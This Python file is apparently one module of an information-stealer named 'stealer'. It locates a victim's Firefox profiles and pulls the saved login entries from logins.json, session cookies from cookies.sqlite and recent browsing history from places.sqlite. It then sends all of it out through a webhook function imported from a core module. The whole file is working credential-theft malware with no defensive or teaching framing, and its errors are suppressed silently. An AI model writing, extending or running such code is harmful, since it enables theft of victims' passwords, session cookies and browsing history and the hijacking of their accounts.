# stealer/firefox.py
import os
import json
import sqlite3
import shutil
import base64
from typing import List, Dict
from stealer.core import temp, send_webhook

def get_firefox_profiles() -> List[str]:
    """Get all Firefox profile paths"""
    appdata = os.environ.get('APPDATA', '')
    firefox_path = os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(firefox_path):
        return []
    profiles = []
    for item in os.listdir(firefox_path):
        profile_dir = os.path.join(firefox_path, item)
        if os.path.isdir(profile_dir) and '.default' in item:
            profiles.append(profile_dir)
    return profiles

def extract_firefox_passwords(profile_path: str) -> List[str]:
    """Extract saved passwords from Firefox"""
    passwords = []
    db_path = os.path.join(profile_path, 'logins.json')
    if not os.path.exists(db_path):
        return passwords
    try:
        with open(db_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
            for entry in data.get('logins', []):
                hostname = entry.get('hostname', '')
                username = entry.get('encryptedUsername', '')
                password = entry.get('encryptedPassword', '')
                # Note: Firefox uses encryption; this extracts raw data
                passwords.append(f"Firefox - URL: {hostname} | User: {username[:50]}... | Pass: {password[:50]}...")
    except Exception as e:
        pass
    return passwords

def extract_firefox_cookies(profile_path: str) -> List[str]:
    """Extract cookies from Firefox"""
    cookies = []
    db_path = os.path.join(profile_path, 'cookies.sqlite')
    if not os.path.exists(db_path):
        return cookies
    try:
        temp_db = temp + "\\firefox_cookies_temp.db"
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host, name, value FROM moz_cookies")
        for row in cursor.fetchall():
            if row[0] and row[1]:
                cookies.append(f"Host: {row[0]} | Cookie: {row[1]}={row[2][:100]}")
        cursor.close()
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        pass
    return cookies

def extract_firefox_history(profile_path: str) -> List[str]:
    """Extract browsing history from Firefox"""
    history = []
    db_path = os.path.join(profile_path, 'places.sqlite')
    if not os.path.exists(db_path):
        return history
    try:
        temp_db = temp + "\\firefox_history_temp.db"
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 100")
        for row in cursor.fetchall():
            if row[0]:
                history.append(f"URL: {row[0]} | Title: {row[1]}")
        cursor.close()
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        pass
    return history

def gather_firefox_data() -> Dict[str, List[str]]:
    """Main function to gather all Firefox data"""
    result = {'passwords': [], 'cookies': [], 'history': []}
    profiles = get_firefox_profiles()
    for profile in profiles:
        result['passwords'].extend(extract_firefox_passwords(profile))
        result['cookies'].extend(extract_firefox_cookies(profile))
        result['history'].extend(extract_firefox_history(profile))
    return result

def send_firefox_data():
    """Send gathered Firefox data to webhook"""
    data = gather_firefox_data()
    if data['passwords']:
        send_webhook("Firefox Passwords:\n" + "\n".join(data['passwords'][:20]))
    if data['cookies']:
        send_webhook("Firefox Cookies:\n" + "\n".join(data['cookies'][:20]))
    if data['history']:
        send_webhook("Firefox History:\n" + "\n".join(data['history'][:30]))
